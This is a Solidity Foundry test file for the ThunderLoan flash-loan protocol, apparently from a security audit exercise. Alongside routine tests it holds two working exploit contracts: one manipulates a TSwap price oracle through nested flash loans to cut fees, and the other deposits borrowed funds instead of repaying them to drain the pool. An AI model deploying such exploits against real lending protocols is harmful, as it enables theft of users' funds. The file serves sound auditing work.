// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    BuffMockPoolFactory buffMockPoolFactory;
    BuffMockTSwap buffMockTSwap;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testRedeemWrongUpdateOfExchangeFee() public setAllowedToken hasDeposits {
        // LP deposits 1000 tokenA
        // LP gets 1000 assetToken due to the exchange rate = 1
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        
        uint256 initialBalanceOfAssetTokensAfterDeposit = assetToken.balanceOf(liquidityProvider);
        uint256 initialBalanceOfUnderlyingTokensAfterDeposit = tokenA.balanceOf(liquidityProvider);

        console.log("initialBalanceOfAssetTokensAfterDeposit", initialBalanceOfAssetTokensAfterDeposit);
        console.log("initialBalanceOfTokenA", initialBalanceOfUnderlyingTokensAfterDeposit);
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, type(uint256).max); // e redeem all asset tokens of the luqiudity provider

        // assert(assetToken.balanceOf(liquidityProvider) == totalAssetTokensAfterDeposit - DEPOSIT_AMOUNT);
        // assert(tokenA.balanceOf(liquidityProvider) == initialBalanceOfUnderlyingTokensAfterDeposit + DEPOSIT_AMOUNT);
    }

    function testManipulateOracle() public {
        // 1. Setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        buffMockPoolFactory = new BuffMockPoolFactory(address(weth));
        address tSwapPool = buffMockPoolFactory.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(buffMockPoolFactory));

        // 2. Fund the TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(tSwapPool, 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(tSwapPool, 100e18);
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp);

        // So we as liqudity providers deposited 100 WETH and 100 tokenA inside the WETH/TokenA liquidity pool (ratio = 1:1)
        vm.stopPrank();
        
        // set the allowed token inside the thunderloan
        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();
        // 3. Fund the ThunderLoan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT); // 1000e18
        vm.stopPrank();

        // 0.296.147.410.319.118.389 ~ 0.3e18
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        MaliciousFlashLoanReceiver receiverContract = new MaliciousFlashLoanReceiver(address(thunderLoan), tSwapPool, address(thunderLoan.getAssetFromToken(tokenA)));
        uint256 flashLoanAmount = 50e18;
        console.log("normalFeeCost", normalFeeCost);
        address flashLoanUser = makeAddr("flashLoanUser");

        vm.startPrank(flashLoanUser);
        tokenA.mint(address(receiverContract), 100e18);
        thunderLoan.flashloan(address(receiverContract), tokenA, flashLoanAmount, "");
        vm.stopPrank();

        // 0.132.187.791.545.262.223 ~ 0.13e18
        uint256 manipulatedFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("manipulatedFeeCost", manipulatedFeeCost);

        // 4. We are going to take 2 flash loans
        //      a. To nuke the price of Weth/tokenA on TSwap
        //      b. To show that doing so greatly reduces the fees paid by the flash loan receiver

        assert(manipulatedFeeCost < normalFeeCost);
    }

    // set tokenA as allowed token
    // LP user deposits 1000 tokenA into the thunderLoan
    function testDepositInsteadOfRepayOnFlashLoan() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        MaliciousDepositFlashLoanReceiver receiverContract = new MaliciousDepositFlashLoanReceiver(address(thunderLoan));
        uint256 initialBalanceOfTokenAReceiver = tokenA.balanceOf(address(receiverContract));
        uint256 flashloanAmount = 100e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, flashloanAmount);

        // mint some tokenA to the receiver contract so he can pays the fee
        tokenA.mint(address(receiverContract), fee);

        // user A takes a flash loan of 100e18 tokenA, but in the executeOperation function of the receiver contract
        // we are calling deposit instead of repay which retrievs the balance of thunderLoan but mints ~99.970 ASSET tokens to the receiver contract
        thunderLoan.flashloan(address(receiverContract), tokenA, flashloanAmount, "");
        vm.stopPrank();

        vm.startPrank(address(receiverContract));
        // here we burning all of the asset tokens that we recieved from the flash loan (in deposit function)
        // and we get back the underlying tokenA
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        uint256 endingBalanceOfTokenAReceiver = tokenA.balanceOf(address(receiverContract));

        // the receiver contract stole all the money from the flash loan
        assert(endingBalanceOfTokenAReceiver > initialBalanceOfTokenAReceiver + flashloanAmount + fee);
    }
}


// initial balance of tokenA on the receiver contract will be 100e18
contract MaliciousDepositFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes memory /* params */
    )
        external
        returns (bool) {
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);

        return true;
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tSwapPool;
    bool attacked; // false
    uint256 poolTokenAmount = 50e18;
    address repayAddress;

    constructor(address _thunderLoan, address _tSwapPool, address _repayAddress) {
        thunderLoan = ThunderLoan(_thunderLoan);
        tSwapPool = BuffMockTSwap(_tSwapPool);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool) {
        // 1. Nuke the price of WETH/TokenA on TSwap
        // 2. Take another flash loan to repay the 1st one but with lower fee cost because of the nuked price
        if (!attacked) {
            // Nuke the price of WETH/TokenA on TSwap
            attacked = true;
            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);

            IERC20(token).approve(address(tSwapPool), amount);
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(amount, wethBought, block.timestamp);

            // Take another flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);

            return true;
        } else {
            IERC20(token).transfer(repayAddress, amount + fee);
            
            return true;
        }
    }


}
